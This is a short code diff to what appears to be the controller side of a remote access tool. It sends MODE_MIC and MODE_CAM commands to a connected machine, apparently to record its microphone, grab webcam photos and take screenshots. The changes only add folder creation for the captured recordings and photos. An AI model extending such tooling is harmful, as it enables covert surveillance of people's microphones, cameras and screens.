@@ -68,6 +68,7 @@ def sysinfo(conn, address):
     input("OK")
 
 def mic(conn, address):
+    if not os.path.exists("records"): os.makedirs("records")
     number = random.randint(0, 9999999)
     print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
     send_data(conn, b"MODE_MIC")
@@ -139,6 +140,7 @@ def download(conn, address):
     input("OK")
 
 def cam(conn, address):
+    if not os.path.exists("photos"): os.makedirs("photos")
     number = random.randint(0, 9999999)
     print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
     send_data(conn, b"MODE_CAM")
@@ -149,6 +151,7 @@ def cam(conn, address):
     input("OK")
 
 def screenshot(conn, address):
+    if not os.path.exists("photos"): os.makedirs("photos")
     try:
         number = random.randint(0, 9999999)
         print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
